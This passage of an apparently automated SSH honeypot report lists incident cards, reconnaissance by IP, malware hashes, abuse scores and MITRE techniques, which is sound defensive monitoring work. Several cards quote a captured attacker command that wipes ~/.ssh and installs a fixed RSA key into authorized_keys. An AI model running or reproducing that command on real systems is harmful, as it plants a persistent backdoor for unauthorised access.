| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 05:54:54` | `cowrie.session.connect` |
| `2026-05-22 05:54:54` | `cowrie.client.version` |
| `2026-05-22 05:54:55` | `cowrie.client.kex` |
| `2026-05-22 05:54:56` | `cowrie.login.success` |
| `2026-05-22 05:54:56` | `cowrie.session.params` |
| `2026-05-22 05:54:56` | `cowrie.command.input` |
| `2026-05-22 05:54:56` | `cowrie.command.failed` |
| `2026-05-22 05:54:57` | `cowrie.log.closed` |
| `2026-05-22 05:54:57` | `cowrie.session.params` |
| `2026-05-22 05:54:57` | `cowrie.command.input` |
| `2026-05-22 05:54:58` | `cowrie.session.file_download` |
| `2026-05-22 05:54:58` | `cowrie.log.closed` |
| `2026-05-22 05:55:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `73.36.177[.]174` to AbuseIPDB if not already reported
- [ ] Block `73.36.177[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-226309996d3e

| Field | Detail |
|---|---|
| **Source IP** | `73.36.177[.]174` |
| **First Seen** | 2026-05-22 05:55 |
| **Last Seen** | 2026-05-22 05:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 05:55:01` | `cowrie.session.connect` |
| `2026-05-22 05:55:01` | `cowrie.client.version` |
| `2026-05-22 05:55:01` | `cowrie.client.kex` |
| `2026-05-22 05:55:02` | `cowrie.login.success` |
| `2026-05-22 05:55:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `73.36.177[.]174` to AbuseIPDB if not already reported
- [ ] Block `73.36.177[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d501b85f2a39

| Field | Detail |
|---|---|
| **Source IP** | `40.81.224[.]203` |
| **First Seen** | 2026-05-22 05:57 |
| **Last Seen** | 2026-05-22 05:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 05:57:02` | `cowrie.session.connect` |
| `2026-05-22 05:57:02` | `cowrie.client.version` |
| `2026-05-22 05:57:02` | `cowrie.client.kex` |
| `2026-05-22 05:57:02` | `cowrie.login.success` |
| `2026-05-22 05:57:02` | `cowrie.session.params` |
| `2026-05-22 05:57:02` | `cowrie.command.input` |
| `2026-05-22 05:57:02` | `cowrie.command.failed` |
| `2026-05-22 05:57:02` | `cowrie.log.closed` |
| `2026-05-22 05:57:03` | `cowrie.session.params` |
| `2026-05-22 05:57:03` | `cowrie.command.input` |
| `2026-05-22 05:57:03` | `cowrie.session.file_download` |
| `2026-05-22 05:57:03` | `cowrie.log.closed` |
| `2026-05-22 05:57:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.81.224[.]203` to AbuseIPDB if not already reported
- [ ] Block `40.81.224[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75e736ffc8bc

| Field | Detail |
|---|---|
| **Source IP** | `40.81.224[.]203` |
| **First Seen** | 2026-05-22 05:57 |
| **Last Seen** | 2026-05-22 05:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 05:57:04` | `cowrie.session.connect` |
| `2026-05-22 05:57:04` | `cowrie.client.version` |
| `2026-05-22 05:57:04` | `cowrie.client.kex` |
| `2026-05-22 05:57:04` | `cowrie.login.success` |
| `2026-05-22 05:57:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.81.224[.]203` to AbuseIPDB if not already reported
- [ ] Block `40.81.224[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-099ec560c3e4

| Field | Detail |
|---|---|
| **Source IP** | `8.222.249[.]206` |
| **First Seen** | 2026-05-22 06:03 |
| **Last Seen** | 2026-05-22 06:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 06:03:07` | `cowrie.session.connect` |
| `2026-05-22 06:03:07` | `cowrie.client.version` |
| `2026-05-22 06:03:07` | `cowrie.client.kex` |
| `2026-05-22 06:03:07` | `cowrie.login.success` |
| `2026-05-22 06:03:07` | `cowrie.session.params` |
| `2026-05-22 06:03:07` | `cowrie.command.input` |
| `2026-05-22 06:03:07` | `cowrie.command.failed` |
| `2026-05-22 06:03:07` | `cowrie.log.closed` |
| `2026-05-22 06:03:08` | `cowrie.session.params` |
| `2026-05-22 06:03:08` | `cowrie.command.input` |
| `2026-05-22 06:03:08` | `cowrie.session.file_download` |
| `2026-05-22 06:03:08` | `cowrie.log.closed` |
| `2026-05-22 06:03:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.222.249[.]206` to AbuseIPDB if not already reported
- [ ] Block `8.222.249[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd18eb058016

| Field | Detail |
|---|---|
| **Source IP** | `8.222.249[.]206` |
| **First Seen** | 2026-05-22 06:03 |
| **Last Seen** | 2026-05-22 06:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 06:03:09` | `cowrie.session.connect` |
| `2026-05-22 06:03:09` | `cowrie.client.version` |
| `2026-05-22 06:03:09` | `cowrie.client.kex` |
| `2026-05-22 06:03:09` | `cowrie.login.success` |
| `2026-05-22 06:03:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.222.249[.]206` to AbuseIPDB if not already reported
- [ ] Block `8.222.249[.]206` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cef12c08cba0

| Field | Detail |
|---|---|
| **Source IP** | `101.126.154[.]252` |
| **First Seen** | 2026-05-22 06:17 |
| **Last Seen** | 2026-05-22 06:17 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 06:17:37` | `cowrie.session.connect` |
| `2026-05-22 06:17:37` | `cowrie.client.version` |
| `2026-05-22 06:17:38` | `cowrie.client.kex` |
| `2026-05-22 06:17:39` | `cowrie.login.success` |
| `2026-05-22 06:17:41` | `cowrie.session.params` |
| `2026-05-22 06:17:41` | `cowrie.command.input` |
| `2026-05-22 06:17:41` | `cowrie.command.failed` |
| `2026-05-22 06:17:41` | `cowrie.log.closed` |
| `2026-05-22 06:17:41` | `cowrie.session.params` |
| `2026-05-22 06:17:41` | `cowrie.command.input` |
| `2026-05-22 06:17:42` | `cowrie.session.file_download` |
| `2026-05-22 06:17:42` | `cowrie.log.closed` |
| `2026-05-22 06:17:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.154[.]252` to AbuseIPDB if not already reported
- [ ] Block `101.126.154[.]252` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5cd5dc9927f

| Field | Detail |
|---|---|
| **Source IP** | `101.126.154[.]252` |
| **First Seen** | 2026-05-22 06:17 |
| **Last Seen** | 2026-05-22 06:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 06:17:50` | `cowrie.session.connect` |
| `2026-05-22 06:17:51` | `cowrie.client.version` |
| `2026-05-22 06:17:51` | `cowrie.client.kex` |
| `2026-05-22 06:17:54` | `cowrie.login.success` |
| `2026-05-22 06:17:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.154[.]252` to AbuseIPDB if not already reported
- [ ] Block `101.126.154[.]252` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb3b3ef844ac

| Field | Detail |
|---|---|
| **Source IP** | `180.106.80[.]16` |
| **First Seen** | 2026-05-22 06:51 |
| **Last Seen** | 2026-05-22 06:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 06:51:37` | `cowrie.session.connect` |
| `2026-05-22 06:51:37` | `cowrie.client.version` |
| `2026-05-22 06:51:37` | `cowrie.client.kex` |
| `2026-05-22 06:51:37` | `cowrie.login.success` |
| `2026-05-22 06:51:38` | `cowrie.session.params` |
| `2026-05-22 06:51:38` | `cowrie.command.input` |
| `2026-05-22 06:51:38` | `cowrie.command.failed` |
| `2026-05-22 06:51:38` | `cowrie.log.closed` |
| `2026-05-22 06:51:38` | `cowrie.session.params` |
| `2026-05-22 06:51:38` | `cowrie.command.input` |
| `2026-05-22 06:51:38` | `cowrie.session.file_download` |
| `2026-05-22 06:51:38` | `cowrie.log.closed` |
| `2026-05-22 06:51:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.106.80[.]16` to AbuseIPDB if not already reported
- [ ] Block `180.106.80[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72e9a828f964

| Field | Detail |
|---|---|
| **Source IP** | `180.106.80[.]16` |
| **First Seen** | 2026-05-22 06:51 |
| **Last Seen** | 2026-05-22 06:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 06:51:44` | `cowrie.session.connect` |
| `2026-05-22 06:51:44` | `cowrie.client.version` |
| `2026-05-22 06:51:45` | `cowrie.client.kex` |
| `2026-05-22 06:51:45` | `cowrie.login.success` |
| `2026-05-22 06:51:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.106.80[.]16` to AbuseIPDB if not already reported
- [ ] Block `180.106.80[.]16` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `104.238.74[.]2` | **24** | 2026-05-22 04:53 | 2026-05-22 06:31 | 12m | 0 | `T1592` | 🟠 MEDIUM |
| `112.28.130[.]136` | **16** | 2026-05-22 04:30 | 2026-05-22 05:28 | 32m | 0 | `T1592` | 🟠 MEDIUM |
| `180.106.80[.]16` | **16** | 2026-05-22 06:39 | 2026-05-22 07:25 | 28m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `197.156.83[.]94` | **15** | 2026-05-22 04:58 | 2026-05-22 05:54 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.126.154[.]252` | **10** | 2026-05-22 05:40 | 2026-05-22 06:19 | 14m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `73.36.177[.]174` | **10** | 2026-05-22 05:21 | 2026-05-22 05:55 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `183.91.11[.]36` | **9** | 2026-05-22 04:01 | 2026-05-22 04:36 | 0m | 9 | `T1110.001 · T1592` | 🟢 LOW |
| `40.81.224[.]201` | **6** | 2026-05-22 05:00 | 2026-05-22 05:57 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `40.81.224[.]200` | **4** | 2026-05-22 05:12 | 2026-05-22 05:52 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `165.154.41[.]205` | **3** | 2026-05-22 07:19 | 2026-05-22 07:19 | 0m | 0 | `T1592` | 🟢 LOW |
| `18.116.202[.]164` | **3** | 2026-05-22 05:42 | 2026-05-22 05:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `18.218.118[.]203` | **2** | 2026-05-22 04:49 | 2026-05-22 04:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `180.76.184[.]79` | **2** | 2026-05-22 04:54 | 2026-05-22 04:56 | 2m | 0 | `T1592` | 🟢 LOW |
| `34.77.103[.]127` | **2** | 2026-05-22 07:21 | 2026-05-22 07:22 | 0m | 0 | `T1592` | 🟢 LOW |
| `34.78.140[.]132` | **2** | 2026-05-22 07:18 | 2026-05-22 07:18 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `40.81.224[.]160` | **2** | 2026-05-22 05:04 | 2026-05-22 05:32 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `40.81.224[.]202` | **2** | 2026-05-22 05:08 | 2026-05-22 05:20 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `47.120.30[.]67` | **2** | 2026-05-22 05:10 | 2026-05-22 05:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.11[.]137` | 1 | 2026-05-22 04:54 | 2026-05-22 04:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `102.88.137[.]213` | 1 | 2026-05-22 04:25 | 2026-05-22 04:25 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.48.218[.]234` | 1 | 2026-05-22 05:09 | 2026-05-22 05:09 | 14s | 0 | `T1592` | 🟢 LOW |
| `118.145.144[.]95` | 1 | 2026-05-22 06:49 | 2026-05-22 06:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.147[.]81` | 1 | 2026-05-22 06:50 | 2026-05-22 06:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.77.206[.]95` | 1 | 2026-05-22 05:49 | 2026-05-22 05:50 | 64s | 1 | `T1110.001` | 🟢 LOW |
| `124.59.42[.]139` | 1 | 2026-05-22 06:46 | 2026-05-22 06:46 | 30s | 0 | `T1592` | 🟢 LOW |
| `125.39.93[.]73` | 1 | 2026-05-22 07:21 | 2026-05-22 07:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `152.32.85[.]4` | 1 | 2026-05-22 07:25 | 2026-05-22 07:25 | 12s | 0 | `T1592` | 🟢 LOW |
| `154.12.28[.]97` | 1 | 2026-05-22 07:50 | 2026-05-22 07:50 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `165.154.105[.]128` | 1 | 2026-05-22 04:16 | 2026-05-22 04:16 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.76.105[.]16` | 1 | 2026-05-22 07:12 | 2026-05-22 07:14 | 120s | 0 | `T1592` | 🟢 LOW |
| `181.123.62[.]210` | 1 | 2026-05-22 04:19 | 2026-05-22 04:19 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.94.33[.]245` | 1 | 2026-05-22 06:42 | 2026-05-22 06:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `189.7.125[.]132` | 1 | 2026-05-22 07:49 | 2026-05-22 07:49 | 2s | 0 | `T1592` | 🟢 LOW |
| `193.235.238[.]6` | 1 | 2026-05-22 05:14 | 2026-05-22 05:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.88.98[.]87` | 1 | 2026-05-22 06:04 | 2026-05-22 06:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.96.139[.]241` | 1 | 2026-05-22 06:30 | 2026-05-22 06:30 | 1s | 0 | `T1592` | 🟢 LOW |
| `40.81.224[.]203` | 1 | 2026-05-22 05:16 | 2026-05-22 05:16 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `5.198.249[.]108` | 1 | 2026-05-22 05:14 | 2026-05-22 05:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]213` | 1 | 2026-05-22 07:24 | 2026-05-22 07:25 | 15s | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]238` | 1 | 2026-05-22 07:42 | 2026-05-22 07:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `87.244.93[.]27` | 1 | 2026-05-22 05:11 | 2026-05-22 05:11 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `34.78.140[.]132` | BE | Google LLC | **100** ⚠️ | 1 |
| `101.126.154[.]252` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 9 |
| `47.120.30[.]67` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 1 |
| `181.123.62[.]210` | PY | Telecel S.A. | **100** ⚠️ | 7 |
| `18.218.118[.]203` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `40.81.224[.]201` | IN | Microsoft Corporation | **100** ⚠️ | 10 |
| `189.7.125[.]132` | BR | Claro NXT Telecomunicacoes Ltda | **100** ⚠️ | 5 |
| `73.36.177[.]174` | US | Comcast IP Services, L.L.C. | **100** ⚠️ | 11 |
| `195.96.139[.]241` | GB | Driftnet Ltd | **100** ⚠️ | 1 |
| `183.94.33[.]245` | CN | China Unicom Hubei Province Network | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 193 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 75 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 66 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 34 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 34 |

---

## 🔕 False Positive Summary (36 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 32 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
